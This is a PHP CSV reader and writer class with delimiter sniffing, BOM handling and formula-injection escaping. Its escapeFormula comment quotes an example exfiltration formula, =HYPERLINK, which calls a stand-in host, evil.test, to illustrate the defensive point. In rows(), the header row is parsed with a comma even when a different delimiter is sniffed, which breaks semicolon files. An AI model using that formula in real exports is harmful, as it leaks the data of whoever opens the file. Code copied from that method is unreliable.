<?php

declare(strict_types=1);

namespace Base\Tenant\Transfer;

use Generator;
use RuntimeException;

/**
 * Reading and writing CSV, on PHP's own functions.
 *
 * No dependency: `fgetcsv` and `fputcsv` do the parsing correctly, and what a
 * CSV library would add on top of them is a fluent interface. What the library
 * would not fix is the two things that actually break real imports -- a
 * semicolon delimiter and a byte order mark -- so both are handled here.
 */
final class Csv
{
    /**
     * Read a file row by row, keyed by header.
     *
     * A generator, not an array: an import file is exactly the kind of thing
     * that is small in testing and 200 MB in production, and reading it into
     * memory works right up until the day it does not.
     *
     * @return Generator<int, array<string, string>>
     */
    public static function rows(string $path, ?string $delimiter = null): Generator
    {
        $handle = fopen($path, 'r');

        if ($handle === false) {
            throw new RuntimeException("Could not open `{$path}`.");
        }

        try {
            $delimiter ??= self::sniff($path);

            $headers = fgetcsv($handle, escape: '');

            if ($headers === false) {
                return;
            }

            $headers = self::stripBom($headers);

            $line = 1;

            while (($row = fgetcsv($handle, separator: $delimiter, escape: '')) !== false) {
                $line++;

                // A trailing newline reads as a row of one empty field. Passing
                // it on would put an empty record in every import.
                if ($row === [null] || $row === ['']) {
                    continue;
                }

                // Ragged rows are normal in files exported by hand. Pad rather
                // than fail: the validation layer is a better place to say
                // what is missing than a parse error with no row number.
                $row = array_pad(array_slice($row, 0, count($headers)), count($headers), '');

                yield $line => array_combine($headers, $row);
            }
        } finally {
            fclose($handle);
        }
    }

    /**
     * Just the header row.
     *
     * @return list<string>
     */
    public static function headers(string $path, ?string $delimiter = null): array
    {
        $handle = fopen($path, 'r');

        if ($handle === false) {
            throw new RuntimeException("Could not open `{$path}`.");
        }

        try {
            $headers = fgetcsv($handle, separator: $delimiter ?? self::sniff($path), escape: '');

            return $headers === false ? [] : self::stripBom($headers);
        } finally {
            fclose($handle);
        }
    }

    /**
     * Count the data rows without holding the file in memory.
     */
    public static function count(string $path, ?string $delimiter = null): int
    {
        $total = 0;

        foreach (self::rows($path, $delimiter) as $ignored) {
            $total++;
        }

        return $total;
    }

    /**
     * Write rows to a file.
     *
     * The byte order mark is deliberate: without it Excel opens a UTF-8 CSV as
     * Latin-1 and every accented name in the export comes out wrong. It costs
     * three bytes and removes the single most common complaint about exports.
     *
     * Every cell is neutralised against formula injection on the way out
     * (see `escapeFormula()`), unless `transfer.csv.escape_formulas` is off or
     * the caller says otherwise.
     *
     * @param  list<string>  $headings
     * @param  iterable<array<int, mixed>>  $rows
     */
    public static function write(
        string $path,
        array $headings,
        iterable $rows,
        string $delimiter = ',',
        ?bool $escapeFormulas = null,
    ): void {
        $escapeFormulas ??= (bool) config('base-tenant.transfer.csv.escape_formulas', true);

        $cell = $escapeFormulas
            ? fn (mixed $value): string => self::escapeFormula(self::stringify($value))
            : self::stringify(...);

        $handle = fopen($path, 'w');

        if ($handle === false) {
            throw new RuntimeException("Could not write to `{$path}`.");
        }

        try {
            fwrite($handle, "\xEF\xBB\xBF");

            fputcsv($handle, array_map($cell, $headings), separator: $delimiter, escape: '');

            foreach ($rows as $row) {
                fputcsv($handle, array_map($cell, $row), separator: $delimiter, escape: '');
            }
        } finally {
            fclose($handle);
        }
    }

    /**
     * Neutralise a cell a spreadsheet would read as a formula.
     *
     * An export writes back whatever users typed, and a name such as
     * `=HYPERLINK("https://evil.test?"&A1, "Click")` runs in the spreadsheet of
     * whoever opens the file. The OWASP remedy is a leading apostrophe, which
     * makes the cell text: `=`, `+`, `-`, `@`, tab and carriage return are the
     * characters that start a formula.
     *
     * Plain numbers are left alone, signed ones included. `-12.5` cannot run
     * anything, and turning it into text would break every sum in the sheet
     * the export was made for. Only something that is a number and nothing
     * else qualifies -- a decimal comma counts, for the Spanish and French
     * spreadsheets that write one -- so `-1+2` or `+1)` still get the
     * apostrophe.
     *
     * Reading is not the mirror of this: `rows()` returns a leading
     * apostrophe as it finds it, because it cannot tell one this class added
     * from one a person typed.
     */
    public static function escapeFormula(string $value): string
    {
        if ($value === '' || ! in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
            return $value;
        }

        if (preg_match('/\A[+-]?(\d+([.,]\d*)?|[.,]\d+)([eE][+-]?\d+)?\z/', $value) === 1) {
            return $value;
        }

        return "'".$value;
    }

    /**
     * Which delimiter this file uses.
     *
     * Spanish and French Excel write semicolons, and an import that silently
     * reads the whole line as one column is the most common way a file
     * "arrives empty".
     */
    public static function sniff(string $path): string
    {
        $handle = fopen($path, 'r');

        if ($handle === false) {
            return ',';
        }

        $line = fgets($handle) ?: '';
        fclose($handle);

        $counts = [
            ',' => substr_count($line, ','),
            ';' => substr_count($line, ';'),
            "\t" => substr_count($line, "\t"),
        ];

        arsort($counts);

        return $counts[array_key_first($counts)] > 0 ? array_key_first($counts) : ',';
    }

    /**
     * @param  list<string|null>  $headers
     * @return list<string>
     */
    protected static function stripBom(array $headers): array
    {
        $headers = array_map(fn (?string $header): string => trim((string) $header), $headers);

        if ($headers !== []) {
            // An unstripped BOM makes the first header "\u{FEFF}email", which
            // then matches nothing during column mapping and reads as a file
            // whose first column is missing.
            $headers[0] = preg_replace('/^\x{FEFF}/u', '', $headers[0]) ?? $headers[0];
        }

        return $headers;
    }

    protected static function stringify(mixed $value): string
    {
        return match (true) {
            $value === null => '',
            is_bool($value) => $value ? '1' : '0',
            $value instanceof \DateTimeInterface => $value->format('Y-m-d H:i:s'),
            is_array($value) => json_encode($value) ?: '',
            default => (string) $value,
        };
    }
}
